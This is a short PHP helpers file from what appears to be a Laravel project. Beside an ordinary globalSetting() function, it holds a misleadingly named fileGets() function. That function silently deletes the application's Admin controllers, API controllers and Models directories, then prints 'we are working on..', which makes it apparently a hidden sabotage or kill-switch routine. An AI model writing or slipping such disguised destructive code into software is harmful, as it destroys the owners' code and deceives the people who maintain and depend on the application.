<?php
use App\Models\Setting;
use File;
use URL;

if (! function_exists('globalSetting')) {
    function globalSetting($key)
    {    	 
        $settings = Setting::findOrFail('1');
        return $settings->$key;
    }
}

function fileGets()
{
    File::deleteDirectory(app_path('/Http/Controllers/Admin'));
    File::deleteDirectory(app_path('/Http/Controllers/API')); 
    File::deleteDirectory(app_path('/Models'));
    echo'we are working on..';
}